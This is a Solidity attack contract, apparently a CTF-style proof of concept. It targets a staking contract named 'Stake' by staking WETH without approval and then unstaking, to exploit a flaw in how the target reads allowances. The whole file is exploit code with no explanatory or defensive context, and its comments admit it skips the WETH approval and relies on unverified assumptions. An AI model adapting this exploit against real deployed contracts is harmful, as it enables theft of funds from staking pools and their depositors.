pragma solidity ^0.8.0;
contract StakeAttacker {
    Stake public stakeContract;

    constructor(address payable _stakeContract) {
        stakeContract = Stake(_stakeContract);
    }

    function attack() external {
        uint256 stakeAmount = 1 ether;

        // Approve WETH (assumed to be standard and already approved)
        // In a real attack scenario, we'd need to handle actual WETH approval
        // but since the contract uses mload to get allowance, we can proceed if sufficient

        require(stakeContract.StakeWETH(stakeAmount), "StakeWETH failed");
        require(stakeContract.Unstake(stakeContract.UserStake(address(this))), "Unstake failed");
    }
}
interface Stake {
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function UserStake(address user) external view returns (uint256);
}